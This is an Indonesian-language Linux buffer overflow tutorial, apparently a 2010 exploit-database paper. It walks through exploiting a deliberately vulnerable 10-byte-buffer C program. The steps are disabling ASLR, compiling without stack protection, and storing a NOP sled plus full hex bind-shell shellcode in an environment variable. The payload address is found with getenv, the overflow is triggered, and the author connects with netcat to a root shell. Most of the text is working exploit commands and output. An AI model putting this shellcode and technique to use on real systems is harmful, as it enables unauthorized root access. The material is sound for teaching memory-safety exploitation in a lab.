							Linux Buffer Overflow Tutorial
							Edisi : Kedua

Penulis : gunslinger_ <yudha.gunslinger@gmail.com>
Tanggal : Mon Jun 28 21:38:14 WIT 2010

Konten  :
1. Pendahuluan
2. Skenario
3. Fungsi getenv()
4. Exploitasi
5. Kesimpulan
6. Special thanks

-- Pendahuluan
Pada tutorial edisi pertama saya menjelaskan tutorial buffer overflow berbuffer 400 byte.
anda bisa melihat tutorial sebelumnya disini -> http://www.exploit-db.com/papers/14069/
sekarang saya akan menjelaskan "bagaimana cara jika buffer lebih kecil dari ukuran payload kita terutama shellcode ?"
dan saya akan menjelaskan strateginya pada tutorial ini.


-- Skenario
kita bisa lihat source aplikasi sebelumnya mirip pada source aplikasi tutorial ini. 
hanya saja yang membedakan buffernya. kali ini aplikasi berbuffer 10 bytes.

sebelum melanjutkan experimen pada skenario tutorial ini, jangan lupa matikan randomisasi stack terlebih dahulu.

root@bt:~# cat /proc/sys/kernel/randomize_va_space
2
root@bt:~# echo 0 > /proc/sys/kernel/randomize_va_space
root@bt:~# cat /proc/sys/kernel/randomize_va_space
0
root@bt:~#


---------------------bof2.c--------------------------
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv)
{
        char buffer[10];
        strcpy(buffer, argv[1]);

        return 0;
}
---------------------EOF-----------------------------


save dengan nama bof2.c ,compile program tersebut . 
perhatian : pada saat mengompile tambahkan opsi -fno-stack-protector dan -mpreferred-stack-boundary=2.

root@bt:~# gcc -g -o bof2 -fno-stack-protector -mpreferred-stack-boundary=2 bof2.c

jadi, bagaimana cara pengexploitasiannya jika buffer sekecil itu ?
kita bisa gunakan "ENVIRONMENT VARIABLE" untuk menyimpan nopsled dan shellcode .
lalu kita ulangi address NOP sampai mengoverwrite register EIP.

langkah pertama, kita perlu menaruh shellcode ke bentuk binary.
saya akan gunakan shellcode binding port 13123 pada tutorial ini, 
dan anda bisa melihat shellcode tersebut di sini : http://inj3ct0r.com/exploits/12608

root@bt:~/bof# echo -ne "\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x6c\x0e\xff\x35\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x66\xf5\x66\x10\x66\x07\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xfb\x87\x9d\xf0\x37\x68\x78\xbe\x16\x9f\x45\x86\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16\xe8\x39\xe5\x9b\x02\xb5\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xf8\x66\xfe\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x87\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e\xa3\xbe\x18\x87\x88\xbe\x16\xe5\x40\x02\xb5" > shellcode3.bin
root@bt:~/bof# cat shellcode3.bin
ë^1É±elÿ5éuöëèêÿÿÿfõff67¾3øå¾ûð7hx¾E¾3øå¾è9å¾3øå¾øfþåtµvåtµvåtµdd¨d£¾?¾å@µroot@bt:~/bof#

selanjutnya, kita buat "ENVIRONMENT VARIABLE" berisi : 200 bytes NOPSLED + SHELLCODE

root@bt:~/bof# export PAYLOAD=$(perl -e 'print "\x90" x 200')$(cat shellcode.bin)
root@bt:~/bof# echo $PAYLOAD
ë^1É±elÿ5éuöëèêÿÿÿfõff67¾3øå¾ûð7hx¾E¾3øå¾è9å¾3øå¾øfþåtµvåtµvåtµdd¨d£¾?¾å@µ
root@bt:~/bof#

ok, kita baru saja selesai menaruh PAYLOAD kita di "ENVIRONMENT VARIABLE".

-- Fungsi getenv()
sekarang kita gunakan getenv() pada bahasa c. 
fungsi getenv() adalah untuk mendapatkan return address variable environment (get environment variable).
jadi kita menggunakan fungsi tersebut untuk mendapatkan return address PAYLOAD kita sebelumnya pada "ENVIRONMENT VARIABLE".
dan source aplikasinya seperti berikut .

---------------------getenv.c--------------------------
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
        printf("%s terletak pada address %p\n", argv[1], getenv(argv[1]));
        return (0);
}
---------------------EOF-----------------------------

yah sangat simple bukan?, namun sangat berguna.

lalu compile program tersebut
root@bt:~/bof# gcc -o getenv getenv.c
root@bt:~/bof# 

sekarang, kita bisa liat dimana alamat PAYLOAD kita berada.

root@bt:~/bof# ./getenv PAYLOAD
PAYLOAD terletak pada address 0xbffffe1e
root@bt:~/bof#

sudah jelas... kita mengetahui PAYLOAD terletak pada address 0xbffffe1e dengan mudah .
kemudian kita tambahkan, sebut saja 100 bytes karena kita harus menemukan alamat yang terletak dengan alamat pertengahan NOPSLED berada.

root@bt:~/bof# printf "%x\n" $((0xbffffe1e + 100))
bffffe82
root@bt:~/bof#

sudah kita dapatkan 0xbffffe1e + 100 = bffffe82 , lalu kita rubah ke bentuk little endian.
-> 82feffbf
lalu kita ubah ke bentuk shellcode
-> \x82\xfe\xff\xbf

-- Eksploitasi
sekarang saatnya kita run PAYLOAD kita pada aplikasi yang vulnerable buffer overflow tersebut .

root@bt:~/bof# ./bof2 $(perl -e 'print "\x82\xfe\xff\xbf" x 10')
Segmentation fault
root@bt:~/bof#

kita mendapatkan segmentation fault karena kita tidak menggunakan sederetan perulangan address. 
lalu bagaimana ? kita bisa gunakan NOP untuk mendorong (push) address dengan cara menaikan byte per byte.

root@bt:~/bof# ./bof2 $(perl -e 'print "\x90" . "\x82\xfe\xff\xbf" x 10')
Segmentation fault
root@bt:~/bof#

masih mendapatkan segmentation fault, coba kita naikan 1 byte demi byte lagi pada address NOP...

root@bt:~/bof# ./bof2 $(perl -e 'print "\x90" x 2 . "\x82\xfe\xff\xbf" x 10')

OoOoOpsss, program bof tidak exit ? apa yang terjadi ? apa shellcode kita tereksekusi dengan baik ?
sebelumnya kita menggunakan shellcode bindport pada port 13123 , 
coba kita buka tab konsole baru dan sambungkan dengan netcat . 

root@bt:~# nc localhost 13123
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
bt
echo YUMMY!
YUMMY!

kita sudah berhasil lagi dalam mengexploitasi buffer overflow .

-- Kesimpulan
kesimpulannya, bahwa seberapa kecil buffer pada aplikasi tetap memungkinkan terjadinya buffer overflow . 
untuk mencegah terjadinya buffer overflow adalah dengan cara membatasi seberapa bytes input data yang dimasukan oleh user . 

-- Special thanks : devilzc0de crew and jasakom crew
		  : www.devilzc0de.org / www.devilzc0de.com - www.jasakom.com , indonesianhacker.org, yogyacarderlink.web.id
		  : serverisdown.org, xc0de.or.id, echo.or.id, hacker-newbie.org, tecon-crew.org
		  : And all exploit database...